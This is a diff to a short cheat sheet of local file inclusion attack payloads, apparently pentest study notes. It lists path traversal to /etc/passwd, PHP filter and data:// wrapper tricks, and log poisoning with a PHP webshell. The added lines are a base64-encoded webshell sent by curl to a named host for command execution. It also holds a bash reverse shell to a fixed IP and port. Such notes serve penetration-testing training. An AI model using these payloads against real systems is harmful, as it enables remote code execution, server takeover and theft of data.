@@ -20,6 +20,7 @@ To automate the process, use the following tools
 -     ../../../../../../etc/passwd%00.jpg
 - php filter
 -     php://filter/convert.base64-encode/resource=
+-      data://text/plain,<?php echo system('ls');?>
 - poising a log file
 - /roc/self/environ || /var/log/auth.log [ssh log file] || /var/log/apache2/access.log [web server log file]
 - poison the auth.log file
@@ -31,6 +32,9 @@ To automate the process, use the following tools
 - add cmd as a parameter
 -     <?php system($_GET['cmd']); ?>
 -     example.com/index.php?view=cat../../../../../../../../../var/log/apache2/access.log&cmd=ls
+- add cmd in data wrapper
+-      echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+-        curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 - bash reverse shell
 -     bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
 - fuzz LFI
